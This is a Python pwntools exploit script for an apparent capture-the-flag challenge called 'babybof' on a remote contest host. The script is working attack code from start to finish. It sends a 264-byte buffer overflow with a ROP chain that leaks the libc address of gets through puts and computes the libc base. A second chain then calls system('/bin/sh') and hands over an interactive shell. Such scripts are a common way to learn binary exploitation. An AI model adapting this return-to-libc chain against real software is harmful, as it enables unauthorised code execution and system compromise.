
from pwn import *

r = remote('chals20.cybercastors.com', 14425)
libc = ELF('./libc6_2.31-0ubuntu9_amd64.so')    # https://libc.blukat.me/
# libc = ELF('/lib/x86_64-linux-gnu/libc.so.6') # local lib
# r = process('./babybof')
elf = ELF('./babybof')

gets_off = libc.sym['gets']

puts = elf.plt['puts']
gets = elf.got['gets']

rdi = 0x04007f3  # pop rdi; ret;
main = 0x040074D

p = b'A' * 264
p += p64(rdi)
p += p64(gets)
p += p64(puts)
p += p64(main)

r.readline()
r.recvuntil('name: ') # remote host
r.sendline(p)
# r.sendline('\n') # local process


w = r.recv().split()
leak = int.from_bytes(w[0], byteorder='little') # remote host
# leak = int.from_bytes(w[3], byteorder='little') # local process

LIBC_BASE = leak - gets_off
ADDR_BINSH = next(libc.search(b'/bin/sh')) + LIBC_BASE
ADDR_SYSTEM = libc.symbols['system'] + LIBC_BASE

print()
log.info('gets address:      ' + hex(leak))
log.info('Libc base address: ' + hex(LIBC_BASE))
log.info('System address:    ' + hex(ADDR_SYSTEM))
log.info('/bin/sh address:   ' + hex(ADDR_BINSH))
print()

p = b'A' * 264
p += p64(rdi+1)
p += p64(rdi)
p += p64(ADDR_BINSH)
p += p64(ADDR_SYSTEM)

r.sendline(p)

r.interactive()

